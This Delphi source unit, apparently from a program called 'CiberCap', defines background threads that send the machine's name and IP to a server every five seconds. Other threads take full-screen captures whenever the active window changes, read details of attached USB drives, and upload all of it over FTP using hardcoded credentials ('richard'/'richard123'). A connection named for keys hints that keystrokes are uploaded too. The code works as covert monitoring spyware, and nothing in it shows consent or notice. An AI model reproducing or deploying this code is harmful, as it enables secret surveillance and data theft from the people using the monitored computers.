unit UnitThreads;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls,IdFTP;

type
 ThreadAviso = class(TThread)
  private
    { Private declarations }
  protected
    procedure Execute; override;
  public
    procedure EnviarMensaje(ip, port, mensaje: string);
    function  GetPcName: string;
    function  GetIPLocal: String;
    procedure MemoError;
  var
  Aviso:Boolean;
  memo:string;
  end;

 ThreadPPPOE = class(TThread)
  private
    { Private declarations }
  protected
    procedure Execute; override;
    procedure MemoError;
  public
  var
  PPPOE:Boolean;
  memo:string;
  end;

 ThreadPantallas = class(TThread)
  private
    { Private declarations }
  protected
    procedure Execute; override;
  public
    function  GetPcName: string;
    function  GetUsuarioTarjeta: string;
    function  GetRegistryData(RootKey: HKEY; Key, Value: string): variant;
    function  GetActiveCaption: string;
    procedure MemoError;
  var
    MSImagen: TMemoryStream;
    Imagen: Boolean;
    VentanaAnterior: string;
    VentanaActiva: string;
    memo: string;
  end;

 ThreadUSB = class(TThread)
  private
    { Private declarations }
  protected
    procedure Execute; override;
  public
    function  GetUsuarioTarjeta: string;
    function  GetRegistryData(RootKey: HKEY; Key, Value: string): variant;
    function  GetPcName: string;
    procedure ObtenerDatosUnidad(unidad: string);
    procedure ExpandirTree;

    var
  //MSUsb     : TMemoryStream;
    MSUsbInfo : TMemoryStream;
    drive1: char;
  end;

implementation
  uses UCiberCap,WinInet,Winsock,IniFiles,jpeg,clFtpUtils,ClipBrd,ShellAPI,Registry;


{ ThreadAviso }

procedure ThreadAviso.Execute;
begin
  inherited;
  Aviso:=true;
  repeat
   sleep(5000);  // cada 5 segundos
   try
    if FCiberCap.ConnectedPPPOE = True then
    begin
      //aqui debo mandar por soket quien soy y que estoy aqui
      EnviarMensaje(FCiberCap.Server, '30', 'EA&EA'+ ','+ GetIPLocal + ',' + GetPcName);
    end;
   except
     memo:='error enviando el mensaje';
     Synchronize(MemoError);
   end;
  until Aviso=False;
end;

procedure ThreadAviso.EnviarMensaje(ip, port, mensaje: string);
begin
  try
    // el puerto debe de ser el 30
    FCiberCap.Cliente.Host := IP;
    FCiberCap.Cliente.Port :=30;
    FCiberCap.Cliente.Connect;
    FCiberCap.Cliente.Socket.WriteLn( Mensaje );
    FCiberCap.Cliente.Disconnect;
  except

  end;
end;

function ThreadAviso.GetPcName: string;
var size: DWORD;
begin
   try
     size := 128;
     setlength(result, size);
     if GetComputername(PChar(result), size) then
        setlength(result, size)
     else result := 'desconocido';
   except

   end;
end;

procedure ThreadAviso.MemoError;
begin
  FCiberCap.Memo1.Lines.Add(memo);
end;

function  ThreadAviso.GetIPLocal: String;
var
  p: PHostEnt;
  s: array[0..128] of AnsiChar;
  p2: pansichar;
  wVersionRequested: WORD;
  wsaData: TWSAData;
begin
  try
    // Arranca la librería WinSock
    wVersionRequested := MAKEWORD( 1, 1 );
    WSAStartup( wVersionRequested, wsaData );

    // Obtiene el nombre del PC
    GetHostName( @s, 128 );
    p := GetHostByName( @s );

    // Obtiene la dirección IP y libera la librería WinSock
    p2 := iNet_ntoa( PInAddr( p^.h_addr_list^ )^ );
    //Result := Result + p2;
    Result := p2;
    WSACleanup;
  except

  end;
end;



{ ThreadPantallas }

procedure ThreadPantallas.Execute;
var
  Bmp: TBitmap;
  Fecha:string;
  Hora:string;
  FJPG:TJPegImage;
  FicheroImagen:string;
begin
 inherited;
 VentanaAnterior:= GetActiveCaption;
 Imagen:=true;
 repeat
   Sleep(1000);
   try
     if FCiberCap.ConnectedPPPOE = True then
     begin
       if (FCiberCap.FTP_Imagen.Connected) then
       begin
         // Capturar solo cuando cambie la ventana
         VentanaActiva:= GetActiveCaption;
         if VentanaAnterior <> VentanaActiva then
         begin
           MSImagen := TMemoryStream.Create;
           // Capturando la Pantalla
           Bmp := TBitmap.Create;
           Bmp.FreeImage;
           Bmp.Width := GetSystemMetrics(SM_CXSCREEN);    //Screen.Width
           Bmp.Height := GetSystemMetrics(SM_CYSCREEN);   //Screen.Height
           BitBlt(Bmp.Canvas.Handle,0,0, Bmp.Width, Bmp.Height, GetDc(0), 0, 0, SRCCOPY);

           FJPG:=TJPEGImage.Create;
           FJPG.CompressionQuality :=100;
           FJPG.Assign(Bmp);
           FJPG.Compress;

           Fecha:=StringReplace(DateToStr(Now),'/','-',[rfReplaceAll]);
           Hora:=StringReplace(TimeToStr(Now),':','.',[rfReplaceAll]);
           FicheroImagen:=GetPcName+'&'+GetUsuarioTarjeta+'&'+Fecha+'&'+Hora+'&'+'I'+'.Temp';

           FJPG.SaveToStream(MSImagen);
           FJPG.Free;
           if FCiberCap.FTP_Imagen.Connected then
           begin
            FCiberCap.FTP_Imagen.Put(MSImagen, FicheroImagen, False,-1 );
            MSImagen.Free;
           end
           else
           begin
            MSImagen.Free;
           end;


         end;
         VentanaAnterior:=VentanaActiva;
       end;
     end;
   except
    memo:='error P';
    Synchronize(MemoError);

    Bmp.Free;
    FJPG.Free;
    MSImagen.Free;
   end;
 until Imagen= false;
end;

function ThreadPantallas.GetActiveCaption: string;
var
  Handle: THandle;
  Len: LongInt;
  Title: String;
begin
  try
     Result := '';
     Handle := GetForegroundWindow;
     if Handle <> 0 then
     begin
       Len := GetWindowTextLength(Handle) + 1;
       SetLength(Title, Len);
       GetWindowText(Handle, PChar(Title), Len);
       GetActiveCaption := TrimRight(Title);
     end;
  except

  end;
end;

function ThreadPantallas.GetPcName: string;
var size: DWORD;
begin
   try
     size := 128;
     setlength(result, size);
     if GetComputername(PChar(result), size) then
        setlength(result, size)
     else result := 'desconocido';
   except

   end;
end;

function ThreadPantallas.GetUsuarioTarjeta: string;
begin
  try
     result:=(GetRegistryData(HKEY_LOCAL_MACHINE,
    '\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\nauta', 'UserName'));

     //Result:='Desconocido';
  except
     memo:='error obteniendo el usuario';
     Synchronize(MemoError);

     Result:='Desconocido';
  end;
end;

procedure ThreadPantallas.MemoError;
begin
  FCiberCap.Memo1.Lines.Add(memo);
end;

function ThreadPantallas.GetRegistryData(RootKey: HKEY; Key, Value: string): variant;
	var
	  Reg: TRegistry;
	  RegDataType: TRegDataType;
	  DataSize, Len: integer;
	  s: string;
    label cantread;
	begin
	  Reg := nil;
	  try
	    Reg := TRegistry.Create(KEY_QUERY_VALUE);
	    Reg.RootKey := RootKey;
	    if Reg.OpenKeyReadOnly(Key) then begin
	      try
	        RegDataType := Reg.GetDataType(Value);
	        if (RegDataType = rdString) or
	           (RegDataType = rdExpandString) then
	          Result := Reg.ReadString(Value)
	        else if RegDataType = rdInteger then
	          Result := Reg.ReadInteger(Value)
	        else if RegDataType = rdBinary then begin
	          DataSize := Reg.GetDataSize(Value);
	          if DataSize = -1 then goto cantread;
	          SetLength(s, DataSize);
	          Len := Reg.ReadBinaryData(Value, PChar(s)^, DataSize);
	          if Len <> DataSize then goto cantread;
	          Result := s;
	        end else
	        cantread:
	          raise Exception.Create(SysErrorMessage(ERROR_CANTREAD));
	      except
	        s := ''; // Deallocates memory if allocated
	        Reg.CloseKey;
	        raise;
	      end;
	      Reg.CloseKey;
	    end
      else
	      raise Exception.Create(SysErrorMessage(GetLastError));
	  except
	    Reg.Free;
	    raise;
	  end;
	  Reg.Free;
	end;



{ ThreadPPPOE }

procedure ThreadPPPOE.Execute;
var i:integer;
    text1:TStringList;
begin
  inherited;
  PPPOE:=true;
  repeat
    Sleep(5000);
    FCiberCap.ConnectedPPPOE:=True;

    try
      if not FCiberCap.FTP_Imagen.Connected then
      begin
        FCiberCap.FTP_Imagen := TIdFTP.Create( nil );
        FCiberCap.FTP_Imagen.Username := 'richard';
        FCiberCap.FTP_Imagen.Password := 'richard123';
        FCiberCap.FTP_Imagen.Host := FCiberCap.Server;
        FCiberCap.FTP_Imagen.Connect;
        FCiberCap.FTP_Imagen.ChangeDir( '/' );
      end;
    except
      memo:='Error FTP_I';
      Synchronize(MemoError);
    end;

    try
      if not FCiberCap.FTP_Teclas.Connected then
      begin
        FCiberCap.FTP_Teclas := TIdFTP.Create( nil );
        FCiberCap.FTP_Teclas.Username := 'richard';
        FCiberCap.FTP_Teclas.Password := 'richard123';
        FCiberCap.FTP_Teclas.Host := FCiberCap.Server;
        FCiberCap.FTP_Teclas.Connect;
        FCiberCap.FTP_Teclas.ChangeDir( '/' );
      end;
    except
      memo:='Error FTP_T';
      Synchronize(MemoError);
    end;
  until PPPOE = false ;
end;

procedure ThreadPPPOE.MemoError;
begin
  FCiberCap.Memo1.Lines.Add(memo);
end;



{ ThreadUSB }

procedure ThreadUSB.Execute;
// var
// drive: char;
// stop: boolean;
// Fecha:string;
// Hora:string;
// FicheroUSB:string;
begin
//  inherited;
//  try
//    if FCiberCap.ConnectedPPPOE = True then
//    begin
//      if (FCiberCap.FTP_USBTree.Connected) then
//      begin
//        //MSUsb:= TMemoryStream.Create;
//        sleep(10000);    //esperar 7 segundos para que se conecte la usb
//
//        stop:=false;
//        while not stop do
//        begin
//          for drive:='c' to 'z' do
//          begin
//             If (GetDriveType(pchar(drive + ':\')) = DRIVE_REMOVABLE) then
//             begin
//               //drive1:=drive;
//               ObtenerDatosUnidad(drive + ':\');
//               //Synchronize(ExpandirTree);
//               stop:=true;
//               Break;
//             end;
//          end;
//        end;
//
////        Fecha:=StringReplace(DateToStr(Now),'/','-',[rfReplaceAll]);
////        Hora:=StringReplace(TimeToStr(Now),':','.',[rfReplaceAll]);
////        FicheroUSB:=GetPcName+'&'+GetUsuarioTarjeta+'&'+Fecha+'&'+Hora+'&'+'U'+'.Temp';
////
////        FCiberCap.cxShellTreeView1.InnerTreeView.SaveToStream(MSUsb);
////        FCiberCap.FTP_USBTree.Put(MSUsb, FicheroUSB, False,-1 );
////        MSUsb.Free;
//      end;
//    end;
//  except
//      //MSUsb.Free;
//  end;
end;

procedure ThreadUSB.ObtenerDatosUnidad(unidad: string);
var
  Fecha:string;
  Hora:string;
  VolumeName : array [0..255] of Char;
  FileSystemType : array [0..255] of Char;
  SerialNum : DWORD;
  MaxFilenameLength : DWORD;
  Flags : DWORD;
  vNumeroClusterLibres, vbytesPorSector, vsectoresPorCluster, vnumeroTotalCluster : Double;

  // USB INFO
  etiqueta, tipoFicheros, numeroSerie : string;
  longitudMaximaFichero : DWORD;
  sectoresPorCluster : DWORD;
  bytesPorSector : DWORD;
  numeroClusterLibres : DWORD;
  numeroTotalCluster : DWORD;
  espacioLibreDisco : double;
  espacioOcupadoDisco : double;
  espacioTotalDisco : double;

  FicheroUSBInfo:string;
begin
  try
    if (FCiberCap.FTP_USB_INFO.Connected) then
    begin
      MSUsbInfo:= TMemoryStream.Create;

      //etiqueta, número serie, sistema archivos, longitud máxima fichero
      if (GetVolumeInformation(PChar(unidad), VolumeName,  256,  @SerialNum,MaxFilenameLength, Flags, FileSystemType, 256))then
      begin
        etiqueta := VolumeName;
        tipoFicheros := FileSystemType;
        numeroSerie := IntToHex(HiWord(SerialNum), 4) + ' - ' + IntToHex(LoWord(SerialNum), 4) ;
        LongitudMaximaFichero := MaxFilenameLength;
      end
      else
      begin
        etiqueta := '';
        tipoFicheros := '';
        LongitudMaximaFichero := 0;
      end;

      //sectores, cluster, ...
      if Windows.GetDiskFreeSpace(pchar(unidad), sectoresPorCluster, bytesPorSector,numeroClusterLibres, numeroTotalCluster) then
      begin
        vNumeroClusterLibres := numeroClusterLibres;
        vbytesPorSector := bytesPorSector;
        vsectoresPorCluster := sectoresPorCluster;
        vnumeroTotalCluster := numeroTotalCluster;
        espacioLibreDisco := vNumeroClusterLibres * vbytesPorSector * vsectoresPorCluster;
        espacioTotalDisco := vnumeroTotalCluster * vbytesPorSector * vsectoresPorCluster;
        espacioOcupadoDisco := espacioTotalDisco - espacioLibreDisco;
      end
      else
      begin
        espacioLibreDisco := 0;
        espacioTotalDisco := 0;
        espacioOcupadoDisco := 0;
        sectoresPorCluster := 0;
        bytesPorSector := 0;
        numeroClusterLibres := 0;
        numeroTotalCluster := 0;
      end;

      with FCiberCap  do
      begin
        MemoUSBInfo.Clear;
        MemoUSBInfo.Lines.Add ('Unidad: ' + Unidad);
        MemoUSBInfo.Lines.Add ('Etiqueta: ' + etiqueta);
        MemoUSBInfo.Lines.Add ('Nº de serie: ' + numeroSerie);
        MemoUSBInfo.Lines.Add ('Sistema de archivo: ' + tipoFicheros);
        MemoUSBInfo.Lines.Add ('Longitud máxima nombre fichero: ' + IntToStr(longitudMaximaFichero));
        MemoUSBInfo.Lines.Add ('Sectores por cluster: ' + FormatFloat('#,###', sectoresPorCluster));
        MemoUSBInfo.Lines.Add ('Bytes por sector: ' + FormatFloat('#,###', bytesPorSector));
        MemoUSBInfo.Lines.Add ('Nº total de cluster: ' + FormatFloat('#,###', numeroTotalCluster));
        MemoUSBInfo.Lines.Add ('Nº de cluster libres: ' + FormatFloat('#,###', numeroClusterLibres));
        MemoUSBInfo.Lines.Add ('Espacio total de disco: ' +  FormatFloat('#,###" Bytes"', espacioTotalDisco));
        MemoUSBInfo.Lines.Add ('Espacio ocupado en disco: ' + FormatFloat('#,###" Bytes"', espacioOcupadoDisco));
        MemoUSBInfo.Lines.Add ('Espacio libre en disco: ' + FormatFloat('#,###" Bytes"', espacioLibreDisco));
      end;
      Fecha:=StringReplace(DateToStr(Now),'/','-',[rfReplaceAll]);
      Hora:=StringReplace(TimeToStr(Now),':','.',[rfReplaceAll]);
      FicheroUSBInfo:=GetPcName+'&'+GetUsuarioTarjeta+'&'+Fecha+'&'+Hora+'&'+'UI'+'.Temp';

      FCiberCap.MemoUSBInfo.Lines.SaveToStream(MSUsbInfo);
      FCiberCap.FTP_USB_INFO.Put( MSUsbInfo, FicheroUSBInfo, False,-1 );

      etiqueta := '';
      numeroSerie := '';
      tipoFicheros := '';
      longitudMaximaFichero := 0;
    end;
    MSUsbInfo.Free;
  except
    MSUsbInfo.Free;
  end;
end;

procedure ThreadUSB.ExpandirTree;
begin
   with FCiberCap.cxShellTreeView1.InnerTreeView do
   begin
     Items.BeginUpdate;
     try
       Root.CustomPath:=drive1 + ':\';
       FullExpand;
     finally
       Items.EndUpdate;
     end;
   end;
end;

function ThreadUSB.GetPcName: string;
var size: DWORD;
begin
   try
     size := 128;
     setlength(result, size);
     if GetComputername(PChar(result), size) then
        setlength(result, size)
     else result := 'desconocido';
   except

   end;
end;

function ThreadUSB.GetUsuarioTarjeta: string;
begin
  try
     result:=(GetRegistryData(HKEY_LOCAL_MACHINE,
     '\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\nauta', 'UserName'));

      //Result:='Desconocido';
  except
     Result:='Desconocido';
  end;
end;

function ThreadUSB.GetRegistryData(RootKey: HKEY; Key, Value: string): variant;
	var
	  Reg: TRegistry;
	  RegDataType: TRegDataType;
	  DataSize, Len: integer;
	  s: string;
    label cantread;
	begin
	  Reg := nil;
	  try
	    Reg := TRegistry.Create(KEY_QUERY_VALUE);
	    Reg.RootKey := RootKey;
	    if Reg.OpenKeyReadOnly(Key) then begin
	      try
	        RegDataType := Reg.GetDataType(Value);
	        if (RegDataType = rdString) or
	           (RegDataType = rdExpandString) then
	          Result := Reg.ReadString(Value)
	        else if RegDataType = rdInteger then
	          Result := Reg.ReadInteger(Value)
	        else if RegDataType = rdBinary then begin
	          DataSize := Reg.GetDataSize(Value);
	          if DataSize = -1 then goto cantread;
	          SetLength(s, DataSize);
	          Len := Reg.ReadBinaryData(Value, PChar(s)^, DataSize);
	          if Len <> DataSize then goto cantread;
	          Result := s;
	        end else
	        cantread:
	          raise Exception.Create(SysErrorMessage(ERROR_CANTREAD));
	      except
	        s := ''; // Deallocates memory if allocated
	        Reg.CloseKey;
	        raise;
	      end;
	      Reg.CloseKey;
	    end
      else
	      raise Exception.Create(SysErrorMessage(GetLastError));
	  except
	    Reg.Free;
	    raise;
	  end;
	  Reg.Free;
	end;


end.
